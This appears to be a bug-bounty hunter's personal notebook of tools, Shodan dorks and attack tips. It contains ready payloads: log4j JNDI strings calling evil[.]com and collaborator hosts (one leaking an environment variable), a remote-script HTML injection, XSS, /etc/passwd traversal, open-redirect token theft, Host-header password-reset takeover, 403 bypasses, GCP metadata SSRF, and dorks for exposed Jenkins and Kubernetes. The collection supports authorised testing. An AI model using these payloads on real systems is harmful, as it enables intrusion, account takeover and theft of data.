https://github.com/EnableSecurity/wafw00f

</dd>
</dl>

</details>

<details>
<summary>Notify</summary>

<dl>
<dd>

https://github.com/projectdiscovery/notify

</dd>
</dl>

</details>

<details>
<summary>Duplicate remover</summary>

<dl>
<dd>

1. https://github.com/s0md3v/uro

2. https://github.com/rotemreiss/uddup

</dd>
</dl>

</details>

<details>
<summary>HTTP Headers list</summary>

<dl>
<dd>

https://gist.githubusercontent.com/iustin24/92a5ba76ee436c85716f003dda8eecc6/raw/d759ed591ce85a1ae256b3936ae21f4951c19f33/headers.txt

https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/http-request-headers/http-request-headers-fields-large.txt

</dd>
</dl>

</details>

<details>
<summary>apkleaks</summary>

<dl>
<dd>

https://github.com/dwisiswant0/apkleaks

</dd>
</dl>

</details>

<details>
<summary>https://github.com/ticarpi/jwt_tool</summary>



</details>

<details>
<summary>Apache Struts CVE-2017-5638</summary>

<dl>
<dd>

https://github.com/mazen160/struts-pwn

</dd>
</dl>

</details>

<details>
<summary>IDN homograph domain checker</summary>

<dl>
<dd>

https://github.com/evilsocket/ditto

</dd>
</dl>

</details>

<details>
<summary>IDN homograph bug `TIP`</summary>

<dl>
<dd>

Account takeover due to unicode normalization issue.

- Victim account: ynoof@hotmail.com

- Attacker account: ynoⓞf@hotmail.com

Due to no validation send to the email and some unicode issues , this leads to account takeover.

<details>
<summary>POC</summary>

<dl>
<dd>

1. Find target email, create email with punycode version

2. Reset password with unicoded version

3. Find reset password link in attacker's creates email adress

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Unauthenticated Instances issues</summary>

<dl>
<dd>

<details>
<summary>Unauthenticated Kubernetes API</summary>

<dl>
<dd>

```
Kubernetes exposes an unauthenticated REST API on port 10250

Once again we have 2 options, nMap for this port or shodan

product:"kubernetes"
port:"10250"

Once a Kubernetes service is detected the first thing to do is to get a list of pods by sending a GET request to the /pods endpoint.


apt-get install node-ws
wscat -c “https://<DOMAIN>:<PORT>/<Location Header Value>” –no-check

Its very easy to get RCE from this method :)
```

</dd>
</dl>

</details>

<details>
<summary>Unauthenticated odoo Manager</summary>

<dl>
<dd>

```
Shodan Dork

http.status:200 http.component:odoo port:8069

After finding instances go to /web/database/manager most of the time there is either no password or it's "admin"

Or simply port scan for 8069
```

</dd>
</dl>

</details>

<details>
<summary>Unauthenticated Jenkins Instance</summary>

<dl>
<dd>

```
Sometimes an application will be running Jenkins which allows Guest/Anonymous signups with /script enabled which allows code exec

Also if you can install plugins there is a terminal plugin

Try dirsearch for /script or use this script to find live Jenkins instances.

Also worth checking Port 8080 alongside 443,80


I recommened if you are working on a big program with thousands of domains to grep for jenkins and pipe all subdomains into full tcp ports scans. Sometimes the instance can be running on a weird port :)


Also grep for these headers

X-Hudson: 1.395
X-Jenkins: 2.204.2
X-Jenkins-Session: d615ef86
X-You-Are-Authenticated-As: anonymous
X-You-Are-In-Group-Disabled: JENKINS-39402:


Shodan Dork to Find Open Jenkins Instances

x-jenkins 200
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Nginx Path Traversal</summary>

<dl>
<dd>

https://twitter.com/403Timeout/status/1479445235424194560?s=20&t=DTRsTBz4tWFuwxorT_khoQ

</dd>
</dl>

</details>

<details>
<summary>Directory path traversal</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

POST %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpassw HTTP/1.1

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Rate Limiting bypass with IP Rotate</summary>



</details>

<details>
<summary>Check new domains in list</summary>

<dl>
<dd>

cat new-output.txt | anew old-output.txt |  
httprobe

</dd>
</dl>

</details>

<details>
<summary>https://leakix.net/</summary>



</details>

<details>
<summary>Java Deserialization RCE</summary>

<dl>
<dd>

<details>
<summary>https://github.com/joaomatosf/jexboss</summary>



</details>

$ for url in $(cat targets.txt); do python3 jexboss.py -u $url; print $url; done

</dd>
</dl>

</details>

<details>
<summary>Search Engines `Multi Purpose`</summary>

<dl>
<dd>

Shodan facet: https://beta.shodan.io/search/facet?query=port%3A443&facet=ssl.version

<details>
<summary>Introduction to shodan</summary>

<dl>
<dd>

https://github.com/jakejarvis/awesome-shodan-queries

</dd>
</dl>

</details>

https://viz.greynoise.io/

https://www.zoomeye.org/

https://fofa.so/

https://onyphe.io/

https://hunter.io/

https://binaryedge.io/

https://app.netlas.io/responses/

https://fullhunt.io/

https://intelx.io/

https://www.immuniweb.com/darkweb/

https://pentest-tools.com/

https://suip.biz/?act=subfinder

https://viewdns.info/

https://www.whoxy.com/

https://myip.ms/

- censys.io – Censys Search Engine

- shodan.io – Search engine for Internet-connected devices

- viz.greynoise.io – GreyNoise Visualizer

- zoomeye.org – Cyberspace Search Engine

- onyphe.io – Cyber Defense Search Engine

- wigle.net – Wireless Network Mapping

- intelx.io – Intelligence X

- fofa.so – Cyberspace Security Search Engine

- hunter.io – OSINT Search Engine

- zorexeye.com – Hacker’s Search Engine

- pulsedive.com – Threat intelligence Search Engine

- netograph.io – Mapping the deep structure of the web

- vigilante.pw – Breached Database Directory

- pipl.com – Search engine for real identity profiles

- abuse.ch – Threat intelligence, malwares etc.

- maltiverse.com – Open IoC Search Engine, Threat Intel

- insecam.org – World biggest online cameras directory

- spyse.com – Internet Assets Search Engine

- dnsdumpster.com – DNS recon & research

- phonebook.cz – Search for subdomains, email addresses, or URLs

</dd>
</dl>

</details>

<details>
<summary>Ping back simple tool (like burp collaborator) , can be used for XMLi too</summary>

<dl>
<dd>

http://pingb.in/

</dd>
</dl>

</details>

<details>
<summary>Investigating Zip files contents (`geniously)`</summary>

<dl>
<dd>

(Did you find a very big zip file accessible on a remote web server and want to inspect its contents, but you don’t want to wait for downloading it? No problem..)

~ pip install remotezip

<details>
<summary>list contents of a remote zip file</summary>

<dl>
<dd>

remotezip -l "http://site/bigfile.zip"

</dd>
</dl>

</details>

<details>
<summary>extract file.txt from a remote zip file</summary>

<dl>
<dd>

remotezip "http://site/bigfile.zip" "file.txt"

</dd>
</dl>

</details>

---

</dd>
</dl>

</details>

<details>
<summary>Oneliners Explainer</summary>

<dl>
<dd>

explainshell.com

ChatGP is better

</dd>
</dl>

</details>

<details>
<summary>Related domains via favicon hash</summary>

<dl>
<dd>

<details>
<summary>tool</summary>

<dl>
<dd>

https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py

https://twitter.com/m4ll0k2/status/1279402680704806912

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

$cat my\_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txt  
$python3 favihash.py -f https://target/favicon.ico -t targets.txt -s

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Shodan easy wins</summary>

<dl>
<dd>

1. “default password” org:orgName

2. “230 login successful” port:21 org:orgName

3. vsftpd 2.3.4 port:21 org:orgName

4. 230 ‘anonymous@’ login ok org:orgName

5. guest login ok org:orgName

6. country:EU port 21 -530 +230 org:orgName

7. country:IN port:80 title:protected org:orgName

</dd>
</dl>

</details>

<details>
<summary>Bugcrowd easy wins</summary>

<dl>
<dd>

https://twitter.com/Muhammad__Aamir/status/1558097341248421889?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

2. Title: Session cookies and JWT token still remain in local storage after logout and can be used to perform authenticated action.

3. After logging in, open Inspect Element and head to Storage. Check the stored cookies. Attempt an authenticated request. Then, log out and verify if the cookies remain. using those stored cookies you observed repeat the authenticated request changing the cookies values to one that remained after logout , If the response discloses any Informations about user Report it [P4].

</dd>
</dl>

</details>

<details>
<summary>Never underestimate power of Google cache</summary>

<dl>
<dd>

https://twitter.com/pry0cc/status/1290682586629582849

</dd>
</dl>

</details>

<details>
<summary>Account Takeover by reset token exposure (Burp history)</summary>

<dl>
<dd>

Now this is a really cool tip to try when testing web apps:

1. Set up Burp in browser1

2. Do a password reset request in browser1

3. Open the password reset email in browser2 (without Burp) and copy the token

4. Search your Burp history (browser1) for the token. If it is there, you’ve got yourself a nice easy account takeover!

</dd>
</dl>

</details>

<details>
<summary>Session Invalidation issues</summary>

<dl>
<dd>

This is a quick tip to quickly find whether the web application is properly invalidating sessions after logout or if there are any caching control security issues:

1. Log in to the application

2. Navigate around the pages

3. Logout

4. Press ( Alt + left-arrow ) buttons

5. If you are logged in or can view the pages navigated earlier by the user, then give yourself a pat.

</dd>
</dl>

</details>

<details>
<summary>Tips on bypassing 403 & 401 errors</summary>

<dl>
<dd>

Here's a list of tips on how to bypass 403 Forbidden and 401 Unauthorized errors:

1. By adding headers: X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For etc. Sometimes companies whitelist the IP for those who can access sensitive data. These headers take IP address as a value and let you access the resource if the supplied IP matches with their whitelisted ones.

2. With unicode chars: Try inserting unicode characters to bypass the defenses. Try e.g. ℀ = ca, ℁ = sa and many other (check here or here). So if /cadmin is blocked, try accessing ℀dmin. Check this short youtube video on unicode hacking tricks for more details.

3. By overriding, overwriting URL with headers: If `GET /admin` gives you `403 Forbidden`, try to `GET /accessible` (any accessible endpoint) and add any of these HTTP headers:

- `X-Original-URL: /admin`

- `X-Override-URL: /admin`

- `X-Rewrite-URL: /admin`

4. **Try different payloads**: If `GET /admin` gives you `403 Forbidden`, try accessing:

- `/accessible/..;/admin`

- `/.;/admin`

- `/admin;/`

- `/admin/~`

- `/./admin/./`

- `/admin?param`

- `/%2e/admin`

- `/admin#`

5. **Method switching**: Change the method from GET to POST, and see if you get something..

6. **Via IP, Vhost**: Access the site via its IP or Vhost to get the forbidden content.

7. **Fuzzing**: By bruteforcing (fuzzing) files or directories further..

8. **Traversing deeper** :

If accessing “/.git” directory returns 403 Forbidden, try accessing a common subdirectory like “/.git/config”. Chances are that it will be accessible.

This is because a forbidden directory doesn’t necessarily mean that access to all subdirectories and files in the directory is forbidden as well! Keep this in mind while bug hunting.

</dd>
</dl>

</details>

<details>
<summary>Tip on finding access control bugs</summary>

<dl>
<dd>

1. Firstly I have two users, one with high privileges (admin), and one with low privileges (joe). I log in as the admin first, and use all the functionality.

2. Whenever I do something that should be reserved for an administrator, I send the request over to Repeater.

3. Once I have a stack of them, I get the cookies from the “joe” account and insert them into those requests. I send them and analyze the difference in response to see if it worked. If it did, I report it!

4. Then, I do the same thing but without any cookies or session tokens to see if it works unauthenticated.

(Authorize Burp plugin is useful here)

</dd>
</dl>

</details>

<details>
<summary>Tips on WAF bypass</summary>

<dl>
<dd>

<details>
<summary>Changing the device type in chrome Dev Tools</summary>

<dl>
<dd>

I triggered the xss by bypassing WAF. How?  
I changed the device type to mobile in Dev Tools.

</dd>
</dl>

</details>

<details>
<summary>Changing the http method</summary>

<dl>
<dd>

```jsx
http://web.com/?XSSendpoint ===> no WAF
https://web.com/?XSSendpoint ===> WAF implemented
```

</dd>
</dl>

</details>

<details>
<summary>XSS</summary>

<dl>
<dd>

Sometimes Websites do not accept XSS due to waf, so I suggest you inject your XSS payload via Android App, it can be triggered on the website without any waf blocking

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Do bitbucket searching</summary>

<dl>
<dd>

Takeaway: Look through org's public repos for Bitbucket content

</dd>
</dl>

</details>

<details>
<summary>Origin IP finder</summary>

<dl>
<dd>

https://twitter.com/_bughunter/status/1532066835989790721?s=20&t=VUMu1Tx51_YX515Swknx3g

https://github.com/Elsfa7-110/bypass-firewalls-by-DNS-history

<details>
<summary>https://x.com/ayadim_/status/1750271127354532329</summary>

<dl>
<dd>

Did you know that you can find original IP of a domain in shodan by using Response headers (in image i used 'last-modified:' and 'content-length' response header to find real IP behind the site :)

choose uniq headers or combine two or more header!  
Sometimes the HTTP Response Header -> `E-Tag` is also helpful to find the origin IP.

or you can use securitytrails to find the ip  
  
This method is applicable to cookies as well. If you observe a website utilizing a particular cookie name, such as “X-Client,” you can search for it on Shodan to access all results linked to that cookie name.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Endpoint monitor tool notifies new endpoints using telegram</summary>

<dl>
<dd>

https://github.com/Elsfa7-110/endzy

</dd>
</dl>

</details>

<details>
<summary>CVE exploits checker</summary>

<dl>
<dd>

https://in.scanfactory.io/cvemon.html

</dd>
</dl>

</details>

<details>
<summary>Adobe AEM tips</summary>

<dl>
<dd>

Adobe AEM Tip: if /content.pages.json doesnt work, try /content/.pages.json

<details>
<summary>tip 2</summary>

<dl>
<dd>

Does the target use AEM?  
try this path  
target[.]com/etc/groovyconsole.html  
and use the payload in the pic  
If you lucky enough you can have nice RCE ;)  
Good luck :)

In most of cases, you should be authenticated,  
In rare case you don't have to   
if you should be authenticated  
you can go to   
target[.]com/libs/granite/core/content/login.html  
in try one of this AEM default credentials

https://open-sez.me/passwd-adobe.htm

in my case it was anonymous:anonymous

![](image%202.png)

</dd>
</dl>

</details>

<details>
<summary>tip 3</summary>

<dl>
<dd>

https://www.pentestpartners.com/security-blog/quick-wins-with-adobe-experience-manager/

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/ARPSyndicate/YourX check pending..</summary>



</details>

<details>
<summary>DS\_store file checker</summary>

<dl>
<dd>

<details>
<summary>https://github.com/emadshanab/ds_store_exp</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/nullenc0de/vps_setup</summary>



</details>

<details>
<summary>SSRF google cloud server endpoint</summary>

<dl>
<dd>

When you have a SSRF vulnerability on a Google Cloud server, the fastest way to grab all internal metadata is this "All in one" payload : hxxp://metadata.google.internal/computeMetadata/v1beta1/?recursive=true

</dd>
</dl>

</details>

<details>
<summary>Setup VPS</summary>

<dl>
<dd>

https://flaviocopes.com/digitalocean-create-vps/

</dd>
</dl>

</details>

<details>
<summary>VPS to telegram automate usage</summary>

<dl>
<dd>

https://github.com/V35HR4J/Automate-Telegram

</dd>
</dl>

</details>

<details>
<summary>Tips for VPS</summary>

<dl>
<dd>

https://twitter.com/rez0__/status/1553109380484288512?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

https://twitter.com/tabaahi_/status/1552961624188735488?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Information Disclosure scan via patterns/regex</summary>

<dl>
<dd>

<details>
<summary>https://github.com/Dheerajmadhukar/back-me-up</summary>



</details>

<details>
<summary>https://github.com/Dheerajmadhukar/cariddi</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Click Jacking to Account-Takeover</summary>

<dl>
<dd>

https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/

</dd>
</dl>

</details>

<details>
<summary>Best writeups</summary>

<dl>
<dd>

https://lutfumertceylan.com.tr

</dd>
</dl>

</details>

<details>
<summary>Cool tool for appending URLs , skipping duplicates & combining parameters</summary>

<dl>
<dd>

https://github.com/pikpikcu/unew

</dd>
</dl>

</details>

<details>
<summary>Grafana Testing Tips</summary>

<dl>
<dd>

<details>
<summary>Check also `GET /avatar/test` Sometime lead to Rce on Grafana</summary>

<dl>
<dd>

e.g , `GET /avatar/tesata%3fd%``http://3dredirect.rhynorater.com` `%https://t.co/BUEw6rIW3n%https://t.co/8SOORV4cmf%26cachebust`

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>HTML injection (POC creation)</summary>

1. Form-based POC:

```html
<form action="YOUR-COLLABORATOR-DOMAIN">
  Password:<br>
  <input name="p"><br>
  <input type="submit" value="Join meet">
</form>
```

2. HTML injection payload:

```html
"><NOSCRIPT><p title="</NOSCRIPT><script src=YOUR-TEST-URL></script>">
```

</details>

<details>
<summary>Building POC to leak PII by @zseano</summary>

<dl>
<dd>

https://www.youtube.com/watch?v=fcAklNSta-U&list=PLKAaMVNxvLmAcY4n3an_SPwpfseHzZ6Yo&index=5

</dd>
</dl>

</details>

<details>
<summary>Learning about tools</summary>

<dl>
<dd>

1. Go to @intigriti bug-byte   
2. Every bug-byte blog post contains tools section  
3. There are bug-byte blogs.   
4. Spend time and learn about tools

</dd>
</dl>

</details>

<details>
<summary>Pro Tip :</summary>

<dl>
<dd>

Go over all URLs to test at least three times, preferably on separate days. On the first pass, I find the most stuff. On the 2nd pass, I find most issues I missed. On the 3rd pass, I barely find anything at all but still have usually missed a few.

</dd>
</dl>

</details>

<details>
<summary>Leaked info’s sources TIP :</summary>

<dl>
<dd>

Leaked Data Over GitHub/Gitlap/Pasten/Google Groups/ Web Community/Etc..

Springboot if you able to get heapdump

Backup and source files

Fuzzing For Endpoints Contains Sensitive data

IDs & Secrets & Apikeys & Tokens in Js files

And there’s A lot of Etc…

</dd>
</dl>

</details>

<details>
<summary>Nice to have a look at :</summary>

<dl>
<dd>

https://osintframework.com/

</dd>
</dl>

</details>

<details>
<summary>Tips : Bypass CSRF Protection</summary>

<dl>
<dd>

https://twitter.com/harshbothra_/status/1533071083015811072?s=20&t=4REhn9TD5xh-t1P9WLY9Dw

<details>
<summary>Things to check for with CSRF</summary>

<dl>
<dd>

- Token predictable (too short, sequential,...)

- Token is placed in every form that needs it

- Token is not session bound

- Token is only checked on length

- Server only checks if token is there

- Server does not check if there is no parameter

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. https://twitter.com/0x_rood/status/1467682739478540289?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

2. https://twitter.com/jae_hak99/status/1335192935197917185?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

3. https://twitter.com/jae_hak99/status/1431866997940240390?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

4. https://twitter.com/m4ll0k/status/1449025386193563651?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

</dd>
</dl>

</details>

<details>
<summary>All about CSRF</summary>

<dl>
<dd>

1. https://twitter.com/rootxyash/status/1480126074994368512?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

2. https://twitter.com/D1r3Wolf_/status/1253227278630219777?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>All about SSRF</summary>

<dl>
<dd>

https://twitter.com/rootxyash/status/1479432917499592704?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

https://twitter.com/d1pakdas/status/1558186313198669824?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

https://x.com/hakluke/status/2118664555114951019?a=kCULYL2-lTZEbvlRnoY&s=20

</dd>
</dl>

</details>

<details>
<summary>All about Rate Limiting</summary>

<dl>
<dd>

https://twitter.com/snap_sec/status/1479030972263723015?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Best VPS to use :</summary>

<dl>
<dd>

https://twitter.com/tabaahi_/status/1532688530131996672

https://twitter.com/nxtexploit/status/1532690472128262145

https://www.cyberick.com/post/get-your-own-vps-for-bug-hunting

https://twitter.com/n0sandb0x/status/1399740395290910723?s=20&t=oky5cuE9-2Q2tjsMh0eTcQ

</dd>
</dl>

</details>

<details>
<summary>Extract all ips from shodan in txt file</summary>

<dl>
<dd>

https://twitter.com/0Init/status/1532510216490737664?s=20&t=4REhn9TD5xh-t1P9WLY9Dw

</dd>
</dl>

</details>

<details>
<summary>Looking for previously entered command in Linux cli</summary>

<dl>
<dd>

history | grep 'something you remember about the command you're looking for' helps a lot

</dd>
</dl>

</details>

<details>
<summary>Bug Bounty Tip</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

1. Turn on your browser and your burpsuite. Surf the program as an authenticated user.

2. Browse all the possible endpoints. Click on all possible functionalities.

3. Surf for as many days as possible. Don't throw your burpsuite project file.

4. Go to HTTP history. Copy all URLs by selecting all requests.

5. Make a python script or use httpx or custom nuclei template to make requests to all the URLs.

6. Grep for 200 or 201 like responses.

7. Result: Previously in the browser, you have surfed all the endpoints and functionalities as a logged in user. But, in the next case you are making unauthenticated requests.

8. Burp extension Autorize can also be used for this purpose. But, this will do it for you in live mode.

<details>
<summary></summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Internal assets = sensitive.

Apps meant for internal usage usually have weaker security than those facing the external.

Sometimes, internal assets aren't so internal.

Here's how you can find such misconfigurations:

1. Most companies have domain names they use internally.  
     
   Ex: PayPal uses "paypalinc.\com".  
     
   To find them:  
   • Use reverse whois https://whoxy.com  
   • Look at the SSL certificates of subdomains  
   • Look at the Javascript files of their apps

2. - Look in the CSP headers of their assets  
    -Search Github  
   Once you have them:  
   Do recon!  
   -> Subfinder/Amass  
   -> Shodan "ssl.cert.subject\.cn:\*.internal.domain"  
   Pairing this with @albinowax ‘s Cracking the Lens research is extremely effective too.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Forgot password endpoint `Tip` :</summary>

<dl>
<dd>

Forget password endpoints with error code parameters:

"/forgetpass.xxx?error=1"

Try to change the value of error code to 0-10, It might give you direct access to password change page without verifying any email or 2FA.

</dd>
</dl>

</details>

<details>
<summary>Account Takeover Tip</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

Account takeover tips  
1.Create an account  
2.For the attacker and the victim to  
3.Reset password

{  
"email":"victim",  
"email":"attacker";  
}

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

1.Go to reset password

2.Enter your Email and intercept request

3.change Host+Referrer+origin  
With your server

4.Victim will receive yourserver/token=$

5.When He Click on Link you will got token

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Oracle E-Business Login mass scan —-</summary>

<dl>
<dd>

<details>
<summary>https://github.com/momika233/Oracle-E-Business_Login</summary>

<dl>
<dd>

Shodan:“X-ORACLE-DMS-ECID” http. title:”Login” 200

</dd>
</dl>

</details>

<details>
<summary>Another way</summary>

<dl>
<dd>

cat subdomains.txt | httpx -mc 200 -path 'OA\_HTML/ibeCAcpSSOReg.jsp' -ms ">Register as individual</a>" -t 200 - rl 100 -o oracle.txt

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Google dork tool - return results as only IPs</summary>

<dl>
<dd>

https://0iq.me/gip/

https://github.com/SeifElsallamy/gip

</dd>
</dl>

</details>

<details>
<summary>Advice on Recon</summary>

<dl>
<dd>

Now that you have the domains, you could group assets by tecnology, get some ports with passive naabu scan for example, or searching on shodan. Then resolve the subdomains to urls with some tool like aquatone, httprobe or httpx. Now you have some more info about the assets.

Another goood idea on recon assessments os to get the company logo favicon and look for the favicon hash

</dd>
</dl>

</details>

<details>
<summary>Bash-Oneliner & Terminal tips & tricks</summary>

<dl>
<dd>

https://github.com/onceupon/Bash-Oneliner

https://twitter.com/hakluke/status/1552628863892480000?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Must watch playlist</summary>

<dl>
<dd>

https://youtube.com/playlist?list=PLr-hXv9DE5yi9gquA9wUNKGlBfMzUrDG9

</dd>
</dl>

</details>

<details>
<summary>One-liner that will clone all repositories of a GitHub user or organization to the current directory.</summary>

<dl>
<dd>

curl https://api.github[.]com/users/$user/repos?per\_page=1000 | jq .[].html\_url | sed "s/\"//g" | parallel -j 20 "git clone "

</dd>
</dl>

</details>

<details>
<summary>Nuclei Guide</summary>

<dl>
<dd>

https://nuclei.projectdiscovery.io/templating-guide/

</dd>
</dl>

</details>

<details>
<summary>Testing by Auth Bearer/ Auth cookie</summary>

<dl>
<dd>

If you get an Authorization Bearer token or Auth Cookie on one domain/site, try it on ALL other domains/sites the target owns to see if it grants access. Sometimes targets only check if token is present/valid, not the access level.

Do this using Burp intruder where the payload is a list of hosts. Usually run it once without auth and record which domains return 401/403, then run it again with auth for just those 401/403 domains and if they return 200/404 etc, usually it = win.

<details>
<summary>Another tip</summary>

<dl>
<dd>

Recent findings about 8 Oauth tokens stealing via open redirect filter bypass from multiple programs. But sadly all were previously & internal duplicates

Payloads:  
?redirect\_to=target[.]com@evil[.]com  
?redirect\_Url=evil[.]com/target[.]com

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Sometimes input restriction is client-side only</summary>

<dl>
<dd>

Tried to input XSS payload through proxy.

Phone Number Field-  
Through Browser: Only Numeric Digits allowed (Alphabet and Special Characters Blocked)

Through Burp Proxy: 123"><svg+onload=prompt(document.domain)> (Stored XSS)

</dd>
</dl>

</details>

<details>
<summary>Intro to DNS RECORDS</summary>

<dl>
<dd>

https://twitter.com/chrisachard/status/1188870256971915265?s=20&t=5atJfw5v-YWuc38COKtY9w

</dd>
</dl>

</details>

<details>
<summary>Mass scan JS files for secrets using nuclei</summary>

<dl>
<dd>

https://twitter.com/ayadiX01/status/1519936168271523840?s=20&t=5atJfw5v-YWuc38COKtY9w

</dd>
</dl>

</details>

<details>
<summary>Search for following in js files to find API endpoints</summary>

<dl>
<dd>

> axios  
> fetch(  
> .get(  
> .post(  
> XMLHttpRequest

</dd>
</dl>

</details>

<details>
<summary>Bugs to try in Signup</summary>

<dl>
<dd>

- Duplicate registration / Overwrite existing user

- DOS at Name/Password field in Signup Page By sending a very long string (100000 characters)

- XSS in username, account name for registration

- IDN homograph to account takeover

</dd>
</dl>

</details>

<details>
<summary>Things to try in github hosted websites</summary>

<dl>
<dd>

1- wp-config.php , wp-config.php.bak (credentials)  
2-xmlpc.php leads to SSRF and information disclosure (got ssrf )  
3-/wp-json/oembed/1.0/proxy?url=burpcollaborator: May be Find SSRF

</dd>
</dl>

</details>

<details>
<summary>Find google cached contents</summary>

<dl>
<dd>

Found a sensitive token being stored in a url? Search Google to see if you can find real tokens being cached to demonstrate impact.

For example, if a URL looks like this:

https://example[.]com/forgotpass?token=TOKEN

Try searching Google for:

site:example[.]com inurl:token

</dd>
</dl>

</details>

<details>
<summary>Finding to what domain the ip is related</summary>

<dl>
<dd>

https://www.sslshopper.com/ssl-checker.html

</dd>
</dl>

</details>

<details>
<summary>Extract endpoints from source code comments</summary>

<dl>
<dd>

<details>
<summary>tool</summary>

<dl>
<dd>

https://github.com/tomnomnom/hacks/tree/master/html-comments

</dd>
</dl>

</details>

<details>
<summary>Usage</summary>

<dl>
<dd>

cat URLS.txt | html-tool comments | grep -oE ‘\b(http|https)://[\w+&-@#/%?=~\_|!;:,.]\*[\w-+&@#~\_|]’

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>5 Great cybersecurity news outlets</summary>

<dl>
<dd>

1. https://www.reddit.com/r/netsec/

2. https://danielmiessler.com/

3. https://thehackernews.com/

4. https://www.wired.com/category/security/

5. https://securib.ee/

</dd>
</dl>

</details>

<details>
<summary>Waybackurls Tip:</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

If you find invite link or private file link that you can share, always try to put that link in wayback if you found result , you will be able access private things.

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

If you found any sensetive url, or config. js, which is giving 404. use waybackurls  
=> echo "sensetive link" | waybackurls - get-versions,  
And it will give you old version of that file.

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

https://github.com/anmolksachan/TheTimeMachine

</dd>
</dl>

</details>

<details>
<summary>Tip 4</summary>

<dl>
<dd>

cat subdomains.txt | waybackurls | tee waybackurls.txt | grep -E "\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.zip|\\.7z|\\.rar|\\.gz|\\.tar”

</dd>
</dl>

</details>

<details>
<summary>Tip 5</summary>

<dl>
<dd>

Find all urls of domain:

1. https://web.archive.org/web/\*/https://www.wework.com/\*

2. https://web.archive.org/cdx/search/cdx?url=\*.brutelogic.com.br/\*&output=text&fl=original&collapse=urlkey&filter=statuscode:200

</dd>
</dl>

</details>

<details>
<summary>Tip 6</summary>

<dl>
<dd>

Tip:- Always grep zip files from waybackdata.  
   
Waybackurls http://target.com | grep zip

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Context understanding is everything !</summary>

<dl>
<dd>

https://twitter.com/hacker_/status/1509545702480760834

</dd>
</dl>

</details>

<details>
<summary>Learning at pro level</summary>

<dl>
<dd>

if you want to be good at hacking, read all great bug hunters tweet like this. Here I search "ssrf @nnwakelam" so that I can read everything @nnwakelam

post about SSRF. It will help you to be great hacker. Don't ask about tips. Use your brain

</dd>
</dl>

</details>

<details>
<summary>Recon Wins `Writeups collection`</summary>

<dl>
<dd>

https://twitter.com/Mah3Sec_/status/1509414501195874306?s=20&t=AVHj6W95ejAr52-NbHVmAw

</dd>
</dl>

</details>

<details>
<summary>Recon is love <3</summary>

<dl>
<dd>

1. Subfinder -d domain.com > output.txt

2. Cat output.txt | grep staging

3. Got subdomains of staging env

4. site: staging.subdomain.com ext: log

</dd>
</dl>

</details>

<details>
<summary>log4j</summary>

<dl>
<dd>

<details>
<summary>Top G payloads</summary>

<dl>
<dd>

1. %24%7Bjndi:ldap://%24%7BhostName%7DXXXX%24%7B::-.%http://7Dburpcollaborator.net  
   %7Dzzzz

2. AWS WAF : ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}

3. CVE-2021-44228 (RCE) - Critical  
   Payload: ${jndi:ldap://evil[.]com:1389/a}

4. CVE-2021-45046 (RCE) - Critical  
   Payload: ${jndi:ldap://127.0.0.1#evil[.]com:1389/a}

5. CVE-2021-45105 (DoS) - High  
   Payload: ${${::-${::-$${::-j}}}}

6. https://twitter.com/wugeej/status/1469982901412728832?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. ${jndi:ldap://${env:user}.xyz.collab.com/a}  
